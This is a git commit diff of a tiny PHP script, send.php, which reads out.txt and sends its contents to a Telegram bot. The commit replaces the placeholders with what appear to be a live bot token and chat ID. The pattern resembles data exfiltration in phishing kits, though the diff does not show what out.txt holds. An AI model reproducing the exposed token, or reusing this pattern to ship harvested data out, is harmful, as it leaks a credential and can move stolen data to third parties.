27a37bc3db54748b3d4b7fa80940940c032e85f6
mstrhaker22-ux <mstrhaker22@gmail.com>
2026-01-04 16:00:28 +0330

    Update send11.php

--- send.php
+++ send.php
@@ -1,5 +1,5 @@
 <?php
     sleep(2);
     $msg = urlencode(file_get_contents("out.txt"));
-    file_get_contents("https://api.telegram.org/botTOKEN/sendMessage?chat_id=CHATID&text=$msg");
+    file_get_contents("https://api.telegram.org/bot7659552435:AAGyCI4qRxkEUebwL3N6MWvtAcm6UGnQAGA/sendMessage?chat_id=7366446181&text=$msg");
 ?>
